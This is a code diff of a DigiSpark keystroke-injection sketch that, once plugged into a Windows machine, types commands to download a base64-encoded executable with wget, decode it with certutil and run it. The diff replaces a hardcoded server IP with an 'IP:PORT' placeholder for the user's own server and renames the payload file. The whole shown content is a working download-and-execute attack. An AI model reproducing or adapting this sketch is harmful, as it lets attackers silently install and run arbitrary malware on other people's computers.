@@ -15,24 +15,24 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   delay(1000);
 
-  DigiKeyboard.print("rm winner3.exe*");
+  DigiKeyboard.print("rm winner.exe*");
   delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   delay(1000);
 
   DigiKeyboard.print("wget ");
-  DigiKeyboard.print("http://164.92.72.82/b64");
-  DigiKeyboard.print(" -o winner3.exe.b64");
+  DigiKeyboard.print("http://IP:PORT/winner.exe.b64"); // Replace this IP address with your IP and PORT
+  DigiKeyboard.print(" -o winner.exe.b64");
   delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   delay(1000);
 
-  DigiKeyboard.print("certutil -decode winner3.exe.b64 winner3.exe");
+  DigiKeyboard.print("certutil -decode winner.exe.b64 winner.exe");
   delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   delay(1000);
 
-  DigiKeyboard.print("./winner3.exe");
+  DigiKeyboard.print("./winner.exe");
   delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   delay(1000);
